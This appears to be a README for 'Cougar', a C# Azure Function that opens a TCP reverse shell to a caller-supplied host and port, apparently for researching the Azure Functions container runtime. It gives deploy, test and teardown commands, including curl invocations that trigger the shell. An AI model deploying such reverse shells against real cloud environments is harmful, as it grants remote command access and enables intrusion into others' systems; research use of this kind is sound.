# Puma Prey Cougar

Cougar is a C# function that can be deployed to the Azure to establish a TCP reverse shell for the purposes of introspecting the Azure Functions container runtime.

## Installing Prerequisites

* [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local)

## Deploying the Function

Requires the Resource Group, Function App (.NET Core, Linux OS), App Service Plan, App Insights, and Storage Account to be created in US West.

```bash
az ad sp create-for-rbac -n "PumaPreyCougar"
```

```bash
func azure functionapp publish pumapreycougar
```

Manually configure the function to run under the SP created above.

Click on function app. Select platform features. Click on identity. Assign function to the service principal.

TODO: TF all the things for the consumption plan.

https://github.com/markgossa/HashiTalk1-TerraformModules
https://www.hashicorp.com/resources/provision-serverless-infrastructure-terraform-azure-pipelines

## Testing in Azure

Using the Invoke URL returned from the publish command above:

```bash
curl "<INSERT INVOKE URL>&ip=[ip-address]&port=[port]"
```

## Teardown

```bash
az group delete --name pumaprey-cougar
```

## Running Locally

```bash
dotnet restore
dotnet build
func start
```

## Testing Locally

```bash
curl 'http://localhost:7071/api/Cougar?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
```

## Azure Function C# Template

```bash
func init Cougar --csharp --dotnet
func new --template "HTTP trigger" --name GetCougar
```
